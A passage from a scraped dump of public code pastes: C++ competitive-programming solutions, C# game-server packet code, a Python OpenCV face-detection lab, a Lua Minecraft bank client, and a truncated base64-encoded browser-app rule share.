// #define cerr if(false)cerr
#define int long long
#define pb push_back
#define F first
#define S second
#define yes cout << ""Yes\n""
#define no cout << ""No\n""
#define yn(x) x ? yes : no
#define f(i, s, e) for (int i = s; i < e; i++)
#define vi vector<int>
#define vb vector<bool>
#define pii pair<int, int>
#define vpi vector<pii>
#define umi unordered_map<int, int>
#define mi map<int, int>
#define si set<int>
#define sc set<char>
#define maxheap priority_queue<int>
#define minheap priority_queue<int, vector<int>, greater<int>>
#define all(x) x.begin(), x.end()
#define minele(x) *min_element(all(x))
#define maxele(x) *max_element(all(x))
#define endl '\n'

const int N = 2e6;
const int MOD = 1e9 + 7;


#ifndef ONLINE_JUDGE
#define debug(x)            \
    cerr << (#x) << "" is ""; \
    _print(x)
#define dbg(x)              \
    cerr << (#x) << "" is "" << x << endl;
#else
#define debug(x)
#define dbg(x)
#endif


template <typename T>
void _print(T a)
{
    cerr << a;
}
template <typename T>
void print(T a)
{
    cout << a << ' ';
}
template <typename T>
void println(T a)
{
    cout << a << endl;
}
template <class T>
istream &operator>>(istream &is, vector<T> &a)
{
    for (auto &x : a)
        is >> x;
    return is;
}
template <class T>
ostream &operator<<(ostream &os, const vector<T> &a)
{
    for (const auto &x : a)
        os << x << ' ';
    return os;
}

template <class T, class V>
void _print(pair<T, V> p);
template <class T>
void _print(vector<T> v);
template <class T>
void _print(set<T> v);
template <class T, class V>
void _print(map<T, V> v);
template <class T>
void _print(multiset<T> v);
template <class T, class V>
void _print(pair<T, V> p)
{
    cerr << ""{"";
    _print(p.F);
    cerr << "","";
    _print(p.S);
    cerr << ""} "";
}
template <class T>
void _print(vector<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(set<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(multiset<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(unordered_map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}

/////////////Sieve///////////////
vb sieve(N + 5, true);
vi primes;
void gensieve()
{
    sieve[0] = sieve[1] = false;
    for (int i = 2; i <= sqrt(N); i++)
    {
        if (sieve[i])
        {
            for (int j = i * i; j <= N; j += i)
                sieve[j] = false;
        }
    }
    for (int i = 2; i <= N; i++)
    {
        if (sieve[i])
            primes.pb(i);
    }
}
////////////////////////////////

int binpow(int a, int b)
{
    int ans = 1;
    a %= MOD;
    while(b)
    {
        if(b & 1)
            ans = ((ans % MOD) * (a % MOD)) % MOD;
        
        a = ((a % MOD) * (a % MOD)) % MOD;
        b >>= 1;
    }
    return ans;
}

void fast()
{
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    cout.tie(NULL);
}

void init_code()
{
#ifndef ONLINE_JUDGE
    freopen(""input.txt"", ""r"", stdin);
    freopen(""output.txt"", ""w"", stdout);
    freopen(""error.txt"", ""w"", stderr);
#endif // ONLINE_JUDGE
}

void solve()
{
    int n;
    cin >> n;
    
    int l = sqrtl(n);
    mi pf;
    for(auto p : primes)
    {
        if(p > l) break;
        while (n % p == 0) n /= p, pf[p]++;
    }
    pf[n] += n >= 2;

    int ans = 0;

    for(auto &[p, x] : pf)
    {
        int y = 1;
        while(x >= y) x -= y, y += 1, ans += 1;
    }

    println(ans);
}

signed main()
{
    init_code();
    fast();
    int t = 1;
    gensieve();
    // cin >> t;
    while (t--)
    {
        solve();
    }
    return 0;
}
"
b68B0sF2,Untitled,Sreekar_0125,C++,Thursday 23rd of November 2023 12:14:29 PM CDT,"#include <bits/stdc++.h>
#include <ext/pb_ds/assoc_container.hpp>
#include <ext/pb_ds/tree_policy.hpp>
using namespace std;
using namespace __gnu_pbds;
template <class T>
using pbds =
    tree<T, null_type, less<T>, rb_tree_tag, tree_order_statistics_node_update>;
#define cerr   \
    if (false) \
    cerr
#define int long long
#define pb push_back
#define F first
#define S second
#define yes cout << ""Yes\n""
#define no cout << ""No\n""
#define yn(x) x ? yes : no
#define f(i, s, e) for (int i = s; i < e; i++)
#define vi vector<int>
#define vb vector<bool>
#define pii pair<int, int>
#define vpi vector<pii>
#define umi unordered_map<int, int>
#define mi map<int, int>
#define si set<int>
#define sc set<char>
#define maxheap priority_queue<int>
#define minheap priority_queue<int, vector<int>, greater<int>>
#define all(x) x.begin(), x.end()
#define minele(x) *min_element(all(x))
#define maxele(x) *max_element(all(x))
#define endl '\n'

const int N = 2e5;
const int MOD = 1e9 + 7;

#ifndef ONLINE_JUDGE
#define debug(x)            \
    cerr << (#x) << "" is ""; \
    _print(x)
#define dbg(x) \
    cerr << (#x) << "" is "" << x << endl;
#else
#define debug(x)
#define dbg(x)
#endif

template <typename T>
void _print(T a)
{
    cerr << a;
}
template <typename T>
void print(T a)
{
    cout << a << ' ';
}
template <typename T>
void println(T a)
{
    cout << a << endl;
}
template <class T>
istream &operator>>(istream &is, vector<T> &a)
{
    for (auto &x : a)
        is >> x;
    return is;
}
template <class T>
ostream &operator<<(ostream &os, const vector<T> &a)
{
    for (const auto &x : a)
        os << x << ' ';
    return os;
}

template <class T, class V>
void _print(pair<T, V> p);
template <class T>
void _print(vector<T> v);
template <class T>
void _print(set<T> v);
template <class T, class V>
void _print(map<T, V> v);
template <class T>
void _print(multiset<T> v);
template <class T, class V>
void _print(pair<T, V> p)
{
    cerr << ""{"";
    _print(p.F);
    cerr << "","";
    _print(p.S);
    cerr << ""} "";
}
template <class T>
void _print(vector<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(set<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(multiset<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(unordered_map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}

/////////////Sieve///////////////
// vb sieve(N + 5, true);
// vi primes;
// void gensieve()
// {
//     sieve[0] = sieve[1] = false;
//     for (int i = 2; i <= sqrt(N); i++)
//     {
//         if (sieve[i])
//         {
//             for (int j = i * i; j <= N; j += i)
//                 sieve[j] = false;
//         }
//     }
//     for (int i = 2; i <= N; i++)
//     {
//         if (sieve[i])
//             primes.pb(i);
//     }
// }
////////////////////////////////

int binpow(int a, int b)
{
    int ans = 1;
    a %= MOD;
    while (b)
    {
        if (b & 1)
            ans = ((ans % MOD) * (a % MOD)) % MOD;

        a = ((a % MOD) * (a % MOD)) % MOD;
        b >>= 1;
    }
    return ans;
}

void fast()
{
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    cout.tie(NULL);
}

void init_code()
{
#ifndef ONLINE_JUDGE

    freopen(""error.txt"", ""w"", stderr);
#endif // ONLINE_JUDGE
}

int ubnd(vi &v, int x)
{
    int n = v.size();
    int l = 0, h = n - 1;

    int ans = n;
    while (l <= h)
    {
        int m = (l + h) >> 1;
        if (v[m] > x)
        {
            ans = m;
            h = m - 1;
        }
        else
        {
            l = m + 1;
        }
    }
    return ans;
}

class MST
{
public:
    int n;
    vi values;
    vector<vi> tree;
    MST(vi &values)
    {
        n = values.size();
        tree.resize(4 * n);
        this->values = values;
        build(0, 0, n - 1);
    }
    void build(int ind, int low, int high)
    {
        if (low == high)
        {
            tree[ind].pb(values[low]);
            return;
        }

        int mid = (low + high) >> 1;

        build(2 * ind + 1, low, mid);
        build(2 * ind + 2, mid + 1, high);

        merge(all(tree[2 * ind + 1]), all(tree[2 * ind + 2]), back_inserter(tree[ind]));
    }
    int query(int ind, int low, int high, int l, int r, int val)
    {
        if (low >= l && high <= r)
        {
            int x = ubnd(tree[ind], val);
            return tree[ind].size() - x;
        }
        if (high < l || low > r)
        {
            return 0;
        }
        int mid = (low + high) >> 1;
        int left = query(2 * ind + 1, low, mid, l, r, val);
        int right = query(2 * ind + 2, mid + 1, high, l, r, val);
        return left + right;
    }
};

vi Tree[N], tin(N), tout(N), flat;

int timer = 0;
void dfs(int par, int node)
{
    flat.pb(node);
    tin[node] = timer++;

    for (auto i : Tree[node])
    {
        if (i != par)
            dfs(node, i);
    }

    flat.pb(node);
    tout[node] = timer++;
}

void solve()
{
    int n;
    cin >> n;

    vi value(n + 1);
    for (int i = 1; i <= n; i++)
    {
        cin >> value[i];
    }

    for (int i = 2; i <= n; i++)
    {
        int x;
        cin >> x;

        Tree[i].pb(x);
        Tree[x].pb(i);
    }
    dfs(-1, 1);

    for (int i = 0; i < flat.size(); i++)
    {
        flat[i] = value[flat[i]];
    }
    MST mst(flat);

    for (int i = 1; i <= n; i++)
    {
        println(mst.query(0, 0, flat.size() - 1, tin[i], tout[i], value[i]) / 2);
    }
}

signed main()
{
    fast();
    int t = 1;
    // cin >> t;
    while (t--)
    {
        solve();
    }
    return 0;
}
"
Yt9Py9iN,Untitled,_Lucifer_,C#,Thursday 23rd of November 2023 11:44:04 AM CDT,"public static unsafe ServerSockets.Packet ActionPick(this ServerSockets.Packet stream, uint UID, ushort dwparam2, ushort timer, string text)
        {
            stream.InitWriter();
            stream.Write(UID); // 4
            stream.Write(220); // 8
            stream.Write(0); // 12
            stream.Write(Extensions.Time32.Now.GetHashCode()); // 16
            stream.Write((ushort)ActionType.Pick); // 20
            stream.Write(dwparam2); // 22
            stream.ZeroFill(8); // 24
            stream.Write(timer); //28
            stream.ZeroFill(3); // 30
            stream.Write(text); // 34
            stream.Finalize(GamePackets.DataMap);
            return stream;
        }
        public static unsafe void Action(this ServerSockets.Packet stream, ActionQuery* pQuery)
        {
            stream.ReadUnsafe(pQuery, sizeof(ActionQuery));
        }
        public static unsafe ServerSockets.Packet ActionCreate(this ServerSockets.Packet stream, ActionQuery* pQuery)
        {
            stream.InitWriter();
            stream.WriteUnsafe(pQuery, sizeof(ActionQuery));
            stream.Finalize(GamePackets.DataMap);
            return stream;
        }
        public static unsafe ServerSockets.Packet ActionCreateWithString(this ServerSockets.Packet stream, ActionQuery* pQuery, params string[] str)
        {
            stream.InitWriter();
            stream.WriteUnsafe(pQuery, sizeof(ActionQuery));
            stream.SeekBackwards(1);
            stream.Write(str);
            stream.Finalize(GamePackets.DataMap);
            return stream;
        }"
zXHmv3DJ,03. Pipes,Spocoman,C++,Thursday 23rd of November 2023 11:06:43 AM CDT,"#include <iostream>

using namespace std;

int main() {
    int pipeCount;
    cin >> pipeCount;

    int* checkup = new int[pipeCount];
    int* installation = new int[pipeCount];

    for (int i = 0; i < pipeCount; i++) {
        cin >> checkup[i];
    }

    for (int i = 0; i < pipeCount; i++) {
        cin >> installation[i];
    }

    for (int i = 0; i < pipeCount; i++) {
        cout << installation[i] / (installation[i] - checkup[i]) << ' ';
    }
    return 0;
}"
RjTN3PSY,Untitled,parv28,C++,Thursday 23rd of November 2023 10:50:34 AM CDT,"class Solution {
public:
    int ladderLength(string beginWord, string endWord, vector<string>& wordList) {
        queue<string> q;
        set<string> visited,words;
        unordered_map<string, int> dist;
        for(string s:wordList)
            words.insert(s);
        visited.insert(beginWord);
        dist[beginWord] = 0;
        q.push(beginWord);
        int res=0;
        while(!q.empty()){
            string curr_string = q.front();
            q.pop();
            string neighbour;
            for(int i=0;i<curr_string.size();i++){
                neighbour = curr_string;
                for(int j='a';j<='z';j++){
                    neighbour[i]=j;
                    if(words.count(neighbour) and !visited.count(neighbour)){
                        q.push(neighbour);
                        visited.insert(neighbour);
                        dist[neighbour] = dist[curr_string] + 1;
                    }
                }
            }
        }
        if(dist.count(endWord) == 0) {
            // endWord is not present
            return 0;
        }
        return dist[endWord] + 1;
    }
};"
fjiCQSa4,lab_8,Valen_IGIG,Python,Thursday 23rd of November 2023 10:48:59 AM CDT,"import cv2

# Загрузка предварительно обученного каскада для обнаружения лиц
face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')

# Захват видео с веб-камеры
cap = cv2.VideoCapture(0)  # 0 означает первую камеру, можно изменить на другой индекс, если у вас есть несколько камер

while True:
    # Считывание кадра из видеопотока
    ret, frame = cap.read()

    # Преобразование кадра в оттенки серого (эффективнее для обработки)
    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)

    # Обнаружение лиц на кадре
    faces = face_cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5, minSize=(30, 30))

    # Рисование прямоугольников вокруг обнаруженных лиц
    for (x, y, w, h) in faces:
        cv2.rectangle(frame, (x, y), (x+w, y+h), (255, 0, 0), 2)

    # Отображение результата
    cv2.imshow('Video', frame)

    # Выход из цикла по нажатию клавиши 'q'
    if cv2.waitKey(1) & 0xFF == ord('q'):
        break

# Освобождение ресурсов
cap.release()
cv2.destroyAllWindows()
"
zWVs2eTi,bankClient,Rayanis55,Lua,Thursday 23rd of November 2023 10:00:40 AM CDT,"-- Variable
 
local receiverID = 14
 
-- Connect Bank
 
rednet.open(""top"")
local message= ""getBankName""
 
rednet.send(receiverID, message)
local senderID,bankName = rednet.receive()
print(bankName)
print(""Power by VenorixSoft"")
print("""")
 
-- Connexion ID
 
write(""Please enter your username: "")
idu = read()
local message= ""TrueID""
info = idu
rednet.send(receiverID, message, info)
 
local senderID,message = rednet.receive()
if message == ""TrueID"" then
    print(""Username correct !"")
    write(""Please enter your password: "")
    password = read(""*"")
    info = password
    message = ""TruePass""
    rednet.send(receiverID, message, info)
    local senderID,message,user,money = rednet.receive()
    if message == ""TruePass"" then
        print(""Mot de passe correct"")
        print(""Bienvenue "" ..user.. ""vous avez"")
        print(money)
    else
        os.reboot()
    end
else
    print(""Username incorrect !"")
    os.reboot()
end"
P8va6dHt,02. Brackets,Spocoman,C++,Thursday 23rd of November 2023 09:46:30 AM CDT,"#include <iostream>
#include <string>

using namespace std;

int main() {
    string expression,
        openBrackets = ""([{"",
        closedBrackets = "")]}"";
    cin >> expression;

    if (expression.length() % 2 == 0) {
        while (expression.length() > 0 && openBrackets.length() > 0) {
            for (size_t i = 1; i < expression.length(); i++) {
                if (expression[i - 1] == openBrackets[0] && expression[i] == closedBrackets[0]) {
                    expression.erase(i - 1, 2);
                    i = 0;
                }
            }
            openBrackets.erase(0, 1);
            closedBrackets.erase(0, 1);
        }
    }

    cout << (expression.length() > 0 ? ""invalid"" : ""valid"") << endl;
    return 0;
}"
v9X82SZj,邀您一起看：乐游原,xiaomianao666,JavaScript,Thursday 23rd of November 2023 09:44:02 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥乐游原@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuinhOWImeWkhOeQhlwiLFwicGF0aFwiOlwiZGF0YVwiLFwicnVsZVwiOlwianM6XFxubGV0IHJ1bGVzID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvcnVsZXNcXFwiKTtcXG5cXG4vL+W5tuWPkeinhOWImeaVsFxcblxcblxcbmZ1bmN0aW9uIGRvdWJsZVRyZWF0aW5nKG9wZW5Nb2RlLCBmaW5kQWxpVXJsLCB0aXRsZSkge1xcbiAgICBsZXQgYWxpVXJsID0gaW5wdXQ7XFxuICAgIGxldCBzaGFyZVB3ZDtcXG4gICAgaWYgKGZpbmRBbGlVcmwpIHtcXG4gICAgICAgIGxldCByZXN1bHQgPSBmaW5kQWxpVXJsKGFsaVVybCk7XFxuICAgICAgICBpZiAodHlwZW9mIHJlc3VsdCA9PT0gXFxcInN0cmluZ1xcXCIpXFxuICAgICAgICAgICAgYWxpVXJsID0gcmVzdWx0O1xcbiAgICAgICAgZWxzZVxcbiAgICAgICAgICAgIGFsaVVybCA9IHJlc3VsdC5hbGlVcmwsIHNoYXJlUHdkID0gcmVzdWx0LnNoYXJlUHdkO1xcbiAgICB9XFxuICAgIGlmIChhbGlVcmwuaW5jbHVkZXMoXFxcInd3dy5hbGl5dW5kcml2ZS5jb20vcy9cXFwiKSkge1xcbiAgICAgICAgaWYgKG9wZW5Nb2RlID09PSBcXFwi5pys5Zyw6L2s56CBXFxcIikge1xcbiAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9wYWdlL2FsaXl1bj9wYWdlPWZ5cGFnZSZydWxlPScgKyB0aXRsZSArICcmcmVhbHVybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGFsaVVybCkgKyBcXFwiJnNoYXJlUHdkPVxcXCIgKyAoc2hhcmVQd2QgfHwgXFxcIlxcXCIpO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICBzaGFyZUlkID0gYWxpVXJsLnNwbGl0KFxcXCIvXFxcIilbNF07XFxuICAgICAgICAgICAgcmV0dXJuICdzbWFydGRyaXZlOi8vc2hhcmUvYnJvd3NlP3NoYXJlSWQ9JyArIHNoYXJlSWQgKyAnJnNoYXJlUHdkPScgKyAoc2hhcmVQd2QgfHwgXFxcIlxcXCIpO1xcbiAgICAgICAgfVxcbiAgICB9IGVsc2UgaWYgKGFsaVVybC5zdGFydHNXaXRoKFxcXCJodHRwXFxcIikpIHtcXG4gICAgICAgIHJldHVybiBcXFwid2ViOi8vXFxcIiArIGFsaVVybDtcXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIHJldHVybiBhbGlVcmw7XFxuICAgIH1cXG59XFxuXFxuZnVuY3Rpb24gZ2V0TW9kZVVybChhbGlVcmwsIHNoYXJlUHdkLCBvcGVuTW9kZSkge1xcbiAgICBpZiAoYWxpVXJsLmluY2x1ZGVzKFxcXCJ3d3cuYWxpeXVuZHJpdmUuY29tL3MvXFxcIikpIHtcXG4gICAgICAgIGlmIChvcGVuTW9kZSA9PT0gXFxcIuacrOWcsOi9rOeggVxcXCIpIHtcXG4gICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vcGFnZS9hbGl5dW4/cGFnZT1meXBhZ2UmcnVsZT0nICsgTVlfUlVMRS50aXRsZSArICcmcmVhbHVybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGFsaVVybCkgKyBcXFwiJnNoYXJlUHdkPVxcXCIgKyAoc2hhcmVQd2QgfHwgXFxcIlxcXCIpO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICBzaGFyZUlkID0gYWxpVXJsLnNwbGl0KFxcXCIvXFxcIilbNF07XFxuICAgICAgICAgICAgcmV0dXJuICdzbWFydGRyaXZlOi8vc2hhcmUvYnJvd3NlP3NoYXJlSWQ9JyArIHNoYXJlSWQgKyAnJnNoYXJlUHdkPScgKyAoc2hhcmVQd2QgfHwgXFxcIlxcXCIpO1xcbiAgICAgICAgfVxcbiAgICB9IGVsc2UgaWYgKGFsaVVybC5zdGFydHNXaXRoKFxcXCJodHRwXFxcIikpIHtcXG4gICAgICAgIHJldHVybiBcXFwid2ViOi8vXFxcIiArIGFsaVVybDtcXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIHJldHVybiBhbGlVcmw7XFxuICAgIH1cXG59XFxuXFxuJC5leHBvcnRzLmNhcnJ5UnVsZSA9IGZ1bmN0aW9uKHJ1bGUsIHMsIHBhZ2UsIHNlYXJjaE1vZGUsIG9wZW5Nb2RlKSB7XFxuICAgIGxldCBsaXN0ID0gcnVsZS5maW5kKHMsIHBhZ2UpO1xcbiAgICBpZiAoIWxpc3QpIHJldHVybiBbXTtcXG4gICAgbGV0IHVybExhenkgPSAkKFxcXCJcXFwiKS5sYXp5UnVsZShkb3VibGVUcmVhdGluZywgb3Blbk1vZGUsIHJ1bGUuZmluZEFsaVVybCwgTVlfUlVMRS50aXRsZSk7XFxuICAgIGxldCBkZXNjVGlwcyA9IFxcXCLigJzigJzigJ3igJ1cXFwiICsgcnVsZS5uYW1lLmZvbnRjb2xvcihcXFwiI2YxM2I2NmFcXFwiKSArIFxcXCImbmJzcDtcXFwiO1xcbiAgICBsZXQgcmVzTGlzdCA9IFtdO1xcblxcbiAgICBmb3IgKGxldCBpdCBvZiBsaXN0KSB7XFxuICAgICAgICBpZiAoaXQuc2tpcCkge1xcbiAgICAgICAgICAgIHJlc0xpc3QucHVzaChpdCk7XFxuICAgICAgICAgICAgY29udGludWU7XFxuICAgICAgICB9XFxuICAgICAgICBpZiAoc2VhcmNoTW9kZSAmJiAhc2VhcmNoQ29udGFpbnMoaXQudGl0bGUsIHMsIHRydWUpKSBjb250aW51ZTtcXG4gICAgICAgIGl0LnVybCA9IHJ1bGUuZmluZEFsaVVybCA/IGl0LnVybCArIHVybExhenkgOiBnZXRNb2RlVXJsKGl0LnVybCwgaXQuc2hhcmVQd2QgfHwgXFxcIlxcXCIsIG9wZW5Nb2RlKTtcXG4gICAgICAgIHJlc0xpc3QucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IGl0LnRpdGxlLmluY2x1ZGVzKFxcXCLigJzigJzigJ3igJ1cXFwiKSA/IGl0LnRpdGxlIDogXFxcIuKAnOKAnOKAneKAnVxcXCIgKyBpdC50aXRsZS5yZXBsYWNlKG5ldyBSZWdFeHAoXFxcIjxlbT58PC9lbT5cXFwiLCBcXFwiZ1xcXCIpLCBcXFwiXFxcIikucmVwbGFjZShuZXcgUmVnRXhwKHMsIFxcXCJnXFxcIiksIFxcXCI8c3Ryb25nPjxzcGFuIHN0eWxlPVxcXFxcXFwiY29sb3I6ICMxRTkwRkZcXFxcXFxcIj5cXFwiICsgcyArIFxcXCI8L3NwYW4+PC9zdHJvbmc+XFxcIiksXFxuICAgICAgICAgICAgZGVzYzogZGVzY1RpcHMgKyBpdC5kZXNjLFxcbiAgICAgICAgICAgIHVybDogaXQudXJsLFxcbiAgICAgICAgICAgIHBpY191cmw6IGl0LnBpY191cmwsXFxuICAgICAgICAgICAgY29sX3R5cGU6IGl0LnBpY191cmwgPyAnbW92aWVfMV92ZXJ0aWNhbF9waWMnIDogXFxcInRleHRfMVxcXCIsXFxuICAgICAgICAgICAgZXh0cmE6IE9iamVjdC5hc3NpZ24oe1xcbiAgICAgICAgICAgICAgICBpbmhlcml0VGl0bGU6IGZhbHNlXFxuICAgICAgICAgICAgfSwgaXQuZXh0cmEpXFxuICAgICAgICB9KTtcXG4gICAgfVxcbiAgICByZXR1cm4gcmVzTGlzdDtcXG59XFxubGV0IHNpemUgPSAxMDtcXG4kLmV4cG9ydHMuZ2V0RGF0YSA9IGZ1bmN0aW9uKHBhZ2UsIHJ1bGUpIHtcXG4gICAgaWYgKCFwYWdlICYmICFydWxlKSB7XFxuICAgICAgICByZXR1cm4gcnVsZXMubWFwKGl0ID0+IGl0Lm5hbWUpO1xcbiAgICB9XFxuICAgIGlmIChydWxlICE9IG51bGwpIHtcXG4gICAgICAgIGlmIChwYWdlICE9IG51bGwgJiYgcGFnZSA+IDEpIHtcXG4gICAgICAgICAgICByZXR1cm4gcnVsZXMuZmlsdGVyKGkgPT4gaS5uYW1lID09IHJ1bGUgJiYgaS5wYWdlKTtcXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiBydWxlcy5maWx0ZXIoaSA9PiBpLm5hbWUgPT0gcnVsZSk7XFxuICAgIH1cXG4gICAgbGV0IHN0YXJ0ID0gKHBhZ2UgLSAxKSAqIHNpemU7XFxuICAgIGlmIChydWxlcy5sZW5ndGggPCBzdGFydCArIDEpIHtcXG4gICAgICAgIHJldHVybiBbXTtcXG4gICAgfVxcbiAgICBsZXQgbGVuID0gc2l6ZTtcXG4gICAgaWYgKHJ1bGVzLmxlbmd0aCA8IHBhZ2UgKiBzaXplKSB7XFxuICAgICAgICBsZW4gPSBydWxlcy5sZW5ndGggLSBzdGFydFxcbiAgICB9XFxuICAgIHJldHVybiBydWxlcy5zbGljZShzdGFydCwgc3RhcnQgKyBsZW4pO1xcbn1cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuaQnOe0oumhtemdolwiLFwicGF0aFwiOlwic291XCIsXCJydWxlXCI6XCJqczpcXG5mdW5jdGlvbiBzZXRIZWFkKCkge1xcbiAgICBpZiAob3Blbk1vZGUgPT0gXFxcIuacrOWcsOi9rOeggVxcXCIpIHtcXG4gICAgICAgIGxldCBhbGlUb2tlbnNGaWxlcGF0aCA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL3Rva2VuUGF0aFxcXCIpLmFsaVRva2Vuc0ZpbGVwYXRoO1xcbiAgICAgICAgbGV0IGEgPSBmZXRjaChhbGlUb2tlbnNGaWxlcGF0aCk7XFxuICAgICAgICBpZiAoIWEgfHwgYSA9PSBcXFwiXFxcIikge1xcbiAgICAgICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiAnPGZvbnQgY29sb3I9XFxcIiMxM0I2MUJcXFwiPuKWkCA8L2ZvbnQ+PGI+5rip6aao5o+Q56S6PGI+JyxcXG4gICAgICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCIsXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwicmljaF90ZXh0XFxcIixcXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL3BhZ2UvbG9naW4jbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjXFxcIixcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiLFxcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuacquajgOa1i+WIsOeZu+W9leS/oeaBr++8jOeCueaIkei3s+i9rOeZu+W9lei0puWPt+mhtemdou+8jOeZu+W9lemYv+mHjOS6keebmOi0puWPt+WQjuaWueWPr+S9v+eUqOacrOWcsOi9rOeggeaooeW8j1xcXCIsXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBwYWdlVGl0bGU6IFxcXCLnmbvlvZXpmL/ph4zkupHnm5hcXFwiXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH1cXG4gICAgfVxcbiAgICBhZGRMaXN0ZW5lcihcXFwib25DbG9zZVxcXCIsICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgY2xlYXJNeVZhcihcXFwic1xcXCIpO1xcbiAgICB9KSk7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIuaQnOe0ou+8mlxcXCIgKyBbXFxcIum7mOiupFxcXCIsIFxcXCLnsr7lh4ZcXFwiXVtzZWFyY2hNb2RlXSxcXG4gICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoKSA9PiB7XFxuICAgICAgICAgICAgc2V0U2VhcmNoTW9kZShnZXRTZWFyY2hNb2RlKCkgPyAwIDogMSk7XFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCJcXG4gICAgICAgIH0pLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJpY29uXzJfcm91bmRcXFwiLFxcbiAgICAgICAgZGVzYzogXFxcIlxcXCIsXFxuICAgICAgICBwaWNfdXJsOiBcXFwiaGlrZXI6Ly9pbWFnZXMvaWNvbl9zZWFyY2g2XFxcIlxcbiAgICB9KTtcXG5cXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBcXFwi5qih5byP77yaXFxcIiArIG9wZW5Nb2RlLFxcbiAgICAgICAgdXJsOiBcXFwic2VsZWN0Oi8vXFxcIiArIEpTT04uc3RyaW5naWZ5KHtcXG4gICAgICAgICAgICB0aXRsZTogXFxcIumAieaLqeaooeW8j1xcXCIsXFxuICAgICAgICAgICAgb3B0aW9uczogW1xcXCLmqKHlvI/vvJrmnKzlnLDovaznoIFcXFwiLCBcXFwi5qih5byP77ya5a6Y5pa5QVBQXFxcIiwgXFxcIueZu+W9lei0puWPtzFcXFwiLCBcXFwi55m75b2V6LSm5Y+3MlxcXCIsIFxcXCJUb2tlbueZu+W9lVxcXCIsIFxcXCLnmbvlvZXkv6Hmga9cXFwiXSxcXG4gICAgICAgICAgICBjb2w6IDEsXFxuICAgICAgICAgICAganM6